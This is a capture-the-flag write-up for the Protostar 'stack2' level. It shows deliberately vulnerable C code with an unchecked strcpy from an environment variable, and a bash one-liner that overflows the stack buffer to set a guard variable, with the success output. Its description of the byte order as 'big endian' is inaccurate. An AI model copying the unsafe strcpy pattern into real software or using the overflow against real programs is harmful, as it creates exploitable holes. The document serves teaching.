# Stack Two

Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

## Writeup

In this code there is a buffer of 64 element and upper that there is the modified variable.

We can set the **GREENIE** environment variable to overflow the buffer and overwrite the modified variabile by corrupting the stack.

The modified variable need to be **0x0d0a0d0a**, we can write it in **big endian** as this:

```bash
GREENIE=`python -c "print('a'*64 + '\x0a\x0d\x0a\x0d')"` /opt/protostar/bin/stack2
```

With this output:

```bash
$ GREENIE=`python -c "print('a'*64 + '\x0a\x0d\x0a\x0d')"` /opt/protostar/bin/stack2
you have correctly modified the variable
```